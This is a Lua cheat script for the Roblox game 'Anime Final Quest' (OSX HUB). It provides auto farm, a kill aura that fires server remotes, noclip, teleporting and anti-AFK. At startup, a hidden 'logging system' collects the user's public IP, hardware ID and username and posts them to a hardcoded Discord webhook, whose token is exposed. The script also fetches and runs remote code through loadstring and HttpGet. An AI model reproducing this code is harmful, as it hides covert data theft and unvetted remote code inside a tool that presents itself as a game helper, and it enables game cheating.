-- [[ Anime Final Quest | OSX HUB ]] --
-- UI Library Loader
local success, OSX = pcall(function()
    -- Attempt to load local dev file first (for developers)
    return loadstring(readfile("OSX_Lib.lua"))()
end)

if not success then
    -- Fallback to Github version
    OSX = loadstring(game:HttpGet("https://raw.githubusercontent.com/yxucnx/OSX-HUB-Lib/refs/heads/main/OSX_Lib.lua?v=" .. tick()))()
end

-- Fetch Game Name
local success, productInfo = pcall(function()
    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
end)
local GameName = success and productInfo and productInfo.Name or "Anime Final Quest"

-- [[ SERVICES ]] --
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

-- [[ LOGGING SYSTEM ]] --
local WebhookURL = "https://discord.com/api/webhooks/1490398138220019825/jlZBTnlWn2ZWKEd4bvBUYjQrnQXCX4N9MjfVSK0ceBqQQVIBHaZQ4xDcPnCnA0SlDbAs"

local function SendLog()
    task.spawn(function()
        local successIP, ip = pcall(function() return game:HttpGet("https://api4.ipify.org/") end)
        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        local time = os.date("%X")
        
        local payload = {
            ["username"] = "𝗢𝗦𝗫 𝗛𝗨𝗕 - 𝗟𝗢𝗚 𝗨𝗦𝗘 𝗦𝗖𝗥𝗜𝗣𝗧",
            ["avatar_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless",
            ["embeds"] = {{
                ["title"] = "[!] : 𝗧𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘁𝗵𝗲 𝘂𝘀𝗲 𝗼𝗳 𝗮 𝘀𝗰𝗿𝗶𝗽𝘁.",
                ["description"] = string.format(
                    "――――――――――――――――――――――\n\n**👤 User :**  ```%s```\n**🎮 Script Name :** ```%s```\n**🖥️ HWID :** ```%s```\n**🔐 KEY :** ```%s```\n**🗺️ IP :** ```%s```\n**❌ ACC BAN :** ```%s```\n**🧾Reason :** ```%s```\n** ⏳ Time Data :** ```%s```\n\n――――――――――――――――――――――",
                    localPlayer.Name, GameName, hwid, "None", (successIP and ip or "Unknown"), "None", "None", time
                ),
                ["color"] = 34303,
                ["footer"] = {
                    ["text"] = "© 2026 Osx Hub. All rights reserved.",
                    ["icon_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless"
                },
                ["image"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1485621966575501312/1490364198008393818/standard_1.gif?ex=69d3c952&is=69d277d2&hm=84671fab55d2308ed14c9bd662582a0e6170d1ed0a55c8c6fcbe0cdbbea901fd&="
                }
            }}
        }
        
        pcall(function()
            (request or http_request or (http and http.request))({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

-- Call Initial Log
SendLog()

-- Window Setup
local Window = OSX:CreateWindow({
    Title = "OSX HUB | " .. GameName,
    Subtitle = "Made by: LilYouDev1997 | Discord: discord.gg/osxhub",
    WindowLogo = "https://img2.pic.in.th/logo512v2.png",
    FloatingLogo = "https://img1.pic.in.th/images/logo512v1.png",
    ToggleKey = Enum.KeyCode.RightControl
})

Window:ShowUpdate({
    Title = "Anime Final Quest Update!",
    Version = OSX.Version,
    Changelog = {
        "เพิ่มฟั่งชั่น Anti AFK ป้องกันโดนเเตะเมื่อไม่อยู่จอเป็นเวลานาน",
        "เเก้ไข Auto Attack ไม่ทำงานเนื่องจากเกมอัพเดต",
        "เเก้ไขระบบ Auto Heal ไม่ยอมกลับมาฟาร์มต่อ",
        "ทำการ ตรวจสอบ ระบบทั้งหมดเพื่อเช็คการทำงานเนื่องจากเกมอัพเดต"
    },
    ButtonText = "Let's Go!",
    Callback = function()
        print("User accepted the update!")
    end
})

-- Variables
_G.AutoFarm = false
_G.AutoAttack = false
_G.FarmPosition = "Behind"
_G.TweenSpeed = 100
_G.AutoHeal = false
local isHealing = false
_G.AutoSkillConfig = {
    One = false,
    Two = false,
    Three = false,
    F = false,
    X = false,
    G = false
}
_G.WalkSpeed = 16
_G.IsCastingSkill = false
_G.AntiAFK = true


-- Main Tab
local MainTab = Window:AddTab({
    Title = "Main Controls",
    SubDescription = "Automation Farming",
    Icon = "home"
})

local FarmPanel = MainTab:AddPanel("Farming Function")

FarmPanel:AddToggle({
    Title = "Auto Farm",
    Description = "เลื่อนไปตีศัตรูที่ใกล้ที่สุดอย่างนุ่มนวล",
    Default = false,
    Callback = function(Value) _G.AutoFarm = Value end
})

FarmPanel:AddDropdown({
    Title = "Farm Position",
    Description = "เลือกจุดที่จะอยู่รอบศัตรู (หันหน้าเข้าหาเอง)",
    Values = {"Behind (หลัง)", "Above (บนหัว)", "Underground (ใต้ดิน)"},
    Default = "Behind (หลัง)",
    Callback = function(Value) _G.FarmPosition = Value end
})

FarmPanel:AddSlider({
    Title = "Farm Speed",
    Description = "ความเร็วในการเลื่อน (ยิ่งเยอะยิ่งไว)",
    Min = 50,
    Max = 500,
    Default = 100,
    Callback = function(Value) _G.TweenSpeed = Value end
})

FarmPanel:AddToggle({
    Title = "Auto Heal (Safety)",
    Description = "วาปไปบนฟ้าเมื่อ HP ต่ำกว่า 40% และฟาร์มต่อเมื่อเลือดเต็ม",
    Default = false,
    Callback = function(Value) 
        _G.AutoHeal = Value 
        if not Value then isHealing = false end
    end
})

FarmPanel:AddToggle({
    Title = "Auto Attack",
    Description = "โจมตีให้อัตโนมัติ (Kill Aura)",
    Default = false,
    Callback = function(Value) _G.AutoAttack = Value end
})

local SkillPanel = MainTab:AddPanel("Skill Modules")

SkillPanel:AddToggle({
    Title = "Auto Skill 1",
    Description = "กดสกิล [1] อัตโนมัติ",
    Default = false,
    Callback = function(Value) _G.AutoSkillConfig.One = Value end
})

SkillPanel:AddToggle({
    Title = "Auto Skill 2",
    Description = "กดสกิล [2] อัตโนมัติ",
    Default = false,
    Callback = function(Value) _G.AutoSkillConfig.Two = Value end
})

SkillPanel:AddToggle({
    Title = "Auto Skill 3",
    Description = "กดสกิล [3] อัตโนมัติ",
    Default = false,
    Callback = function(Value) _G.AutoSkillConfig.Three = Value end
})

SkillPanel:AddToggle({
    Title = "Auto Skill F",
    Description = "กดสกิล [F] อัตโนมัติ",
    Default = false,
    Callback = function(Value) _G.AutoSkillConfig.F = Value end
})

SkillPanel:AddToggle({
    Title = "Auto Skill X",
    Description = "กดสกิล [X] อัตโนมัติ",
    Default = false,
    Callback = function(Value) _G.AutoSkillConfig.X = Value end
})

SkillPanel:AddToggle({
    Title = "Auto Skill G",
    Description = "กดสกิล [G] อัตโนมัติ",
    Default = false,
    Callback = function(Value) _G.AutoSkillConfig.G = Value end
})

-- Player Tab
-- local PlayerTab = Window:AddTab({
--     Title = "Local Player",
--     SubDescription = "Character Enhancements",
--     Icon = "user"
-- })

-- local StatsPanel = PlayerTab:AddPanel("Character Stats")

-- [[ PLAYER FEATURES WILL GO HERE ]] --

-- Settings Tab
local SettingsTab = Window:AddTab({
    Title = "Settings",
    SubDescription = "UI & System Config",
    Icon = "settings"
})

local ConfigPanel = SettingsTab:AddPanel("Interface Settings")

ConfigPanel:AddKeybind({
    Title = "Toggle UI Key",
    Description = "กดปุ่มเพื่อ เปิด หรือ ปิด หน้าต่างเมนู",
    Default = "RightControl",
    Callback = function()
        print("Toggle key pressed")
    end
})

ConfigPanel:AddToggle({
    Title = "Anti AFK",
    Description = "ป้องกันการโดนเตะออกจากเกมเมื่อไม่ได้ขยับ",
    Default = _G.AntiAFK,
    Callback = function(Value) _G.AntiAFK = Value end
})

ConfigPanel:AddButton({
    Title = "Destroy UI",
    Description = "ปิดการใช้งานทั้งหมดเเละปิด UI",
    Callback = function()
        Window:Destroy()
        OSX:Notify({Title = "System", Content = "UI Destroyed Successfully."})
    end
})

OSX:Notify({
    Title = "OSX HUB Loaded",
    Content = "AnimeFinalQuest.lua is ready!",
    Duration = 5
})

print("Anime Final Quest UI Loaded.")

-- [[ SEARCH FUNCTIONS ]] --
local function GetNearestNPC()
    local target, distance = nil, math.huge
    local hrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    
    local npcs = workspace:FindFirstChild("NPCs")
    if npcs then
        for _, v in ipairs(npcs:GetChildren()) do
            local hum = v:FindFirstChildOfClass("Humanoid")
            local mHrp = v:FindFirstChild("HumanoidRootPart")
            if hum and mHrp and hum.Health > 0 then
                local dist = (mHrp.Position - hrp.Position).Magnitude
                if dist < distance then
                    distance, target = dist, v
                end
            end
        end
    end
    return target
end

-- [[ MOVEMENT FUNCTIONS ]] --
local CurrentTween = nil
local function TweenTo(cf, speed)
    local char = localPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    local dist = (hrp.Position - cf.Position).Magnitude
    local duration = dist / (speed or 100)
    
    if CurrentTween then CurrentTween:Cancel() end
    CurrentTween = TweenService:Create(hrp, TweenInfo.new(duration, Enum.EasingStyle.Linear), {CFrame = cf})
    CurrentTween:Play()
    return CurrentTween
end

-- [[ AUTOMATION LOGIC ]] --
local currentHitCount = 2
local isTargetingNPC = false

-- [[ SMART NOCLIP SYSTEM ]] --
task.spawn(function()
    game:GetService("RunService").Stepped:Connect(function()
        if _G.AutoFarm and isTargetingNPC then
            local char = localPlayer.Character
            if char then
                for _, v in ipairs(char:GetDescendants()) do
                    if v:IsA("BasePart") then v.CanCollide = false end
                end
            end
        end
    end)
end)

-- Tween Farm Loop
task.spawn(function()
    while true do
        task.wait()
        
        local char = localPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        
        if _G.AutoFarm and not isHealing and not _G.IsCastingSkill then
            local npc = GetNearestNPC()
            
            if npc and hrp then
                isTargetingNPC = true
                local mHrp = npc:FindFirstChild("HumanoidRootPart")
                if mHrp then
                    -- Position logic
                    local targetPos = mHrp.Position
                    local offsetPos = Vector3.new(0, 0, 0)
                    
                    if _G.FarmPosition == "Behind (หลัง)" then
                        offsetPos = mHrp.CFrame.LookVector * -3
                    elseif _G.FarmPosition == "Above (บนหัว)" then
                        offsetPos = Vector3.new(0, 7, 0)
                    elseif _G.FarmPosition == "Underground (ใต้ดิน)" then
                        offsetPos = Vector3.new(0, -7, 0)
                    end
                    
                    -- Calculate target CFrame (Pos + offset, Facing NPC)
                    local finalPos = mHrp.Position + offsetPos
                    local finalCFrame = CFrame.lookAt(finalPos, mHrp.Position)
                    
                    -- Tween to Target (Maintain Unanchored for Replication)
                    TweenTo(finalCFrame, _G.TweenSpeed)
                    
                    -- Velocity Reset instead of Anchoring
                    hrp.Velocity = Vector3.new(0, 0, 0)
                    hrp.RotVelocity = Vector3.new(0, 0, 0)
                end
            else
                isTargetingNPC = false
                if CurrentTween then CurrentTween:Cancel() CurrentTween = nil end
            end
        else
            isTargetingNPC = false
            if CurrentTween then CurrentTween:Cancel() CurrentTween = nil end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(0.1)
        if _G.AutoAttack then
            local char = localPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            
            -- Latch Position (Stop forward motion from game combos)
            if hrp then
                hrp.Velocity = Vector3.new(0, 0, 0)
                hrp.RotVelocity = Vector3.new(0, 0, 0)
            end
            
            pcall(function()
                local args = {
                    {
                        {
                            state = Enum.HumanoidStateType.Running,
                            hitcount = currentHitCount
                        },
                        "\f"
                    }
                }
                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
            end)
            
            -- Cycle hitcount from 2 to 4 (based on your log)
            currentHitCount = currentHitCount + 1
            if currentHitCount > 4 then
                currentHitCount = 2
            end
        end
    end
end)

-- [[ SAFETY & HEAL LOGIC ]] --
task.spawn(function()
    while true do
        task.wait(0.5)
        local char = localPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        
        if hum and hrp and _G.AutoHeal then
            -- Trigger Healing (Lower than 40%)
            if (hum.Health / hum.MaxHealth) < 0.4 and not isHealing then
                isHealing = true
                
                -- [[ IMMEDIATE SAFETY ACTIONS ]] --
                if CurrentTween then CurrentTween:Cancel() CurrentTween = nil end -- Stop moving
                
                OSX:Notify({Title = "Safety System", Content = "HP is low! Teleporting to safety...", Duration = 3})
                print("[OSX HUB] Safety Triggered: HP < 40% (" .. math.floor(hum.Health) .. "/" .. math.floor(hum.MaxHealth) .. ")")
                
                -- Store ground position (as backup)
                local originalGroundPos = hrp.Position
                local startTime = tick()
                
                -- Stay until Health >= 90%
                while (hum.Health / hum.MaxHealth) < 0.9 and _G.AutoHeal and char.Parent do
                    -- Move around in a circle to dodge boss attacks
                    local timeElapsed = tick() - startTime
                    local safePos = originalGroundPos + Vector3.new(math.sin(timeElapsed * 2) * 50, 500, math.cos(timeElapsed * 2) * 50)
                    
                    hrp.CFrame = CFrame.new(safePos)
                    hrp.Velocity = Vector3.new(0, 0, 0)
                    task.wait(0.1)
                end
                
                -- Teleport back down instantly to remove delay
                if char.Parent and hrp then
                    hrp.CFrame = CFrame.new(originalGroundPos)
                end
                
                isHealing = false
                OSX:Notify({Title = "Safety System", Content = "Healed! Resuming Farm...", Duration = 3})
            end
        end
    end
end)

-- [[ AUTO SKILL LOGIC ]] --
local VirtualInputManager = game:GetService("VirtualInputManager")

task.spawn(function()
    while true do
        task.wait(1) -- Check frequently
        for keyName, isEnabled in pairs(_G.AutoSkillConfig) do
            if isEnabled then
                if keyName == "G" then
                    _G.IsCastingSkill = true
                    if CurrentTween then CurrentTween:Cancel() CurrentTween = nil end
                    task.wait(0.2) -- Let the character fully stop
                end
                
                pcall(function()
                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode[keyName], false, game)
                    task.wait(0.05)
                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode[keyName], false, game)
                end)
                
                if keyName == "G" then
                    task.wait(1.5) -- Long pause to let the G skill (awakening/ult) finish its animation
                    _G.IsCastingSkill = false
                end
                
                task.wait(0.5) -- Small gap between different skills
            end
        end
    end
end)

-- [[ ANTI AFK LOGIC ]] --
task.spawn(function()
    local VirtualUser = game:GetService("VirtualUser")
    localPlayer.Idled:Connect(function()
        if _G.AntiAFK then
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
            print("[OSX HUB] Anti-AFK: Prevented Disconnect")
        end
    end)
end)
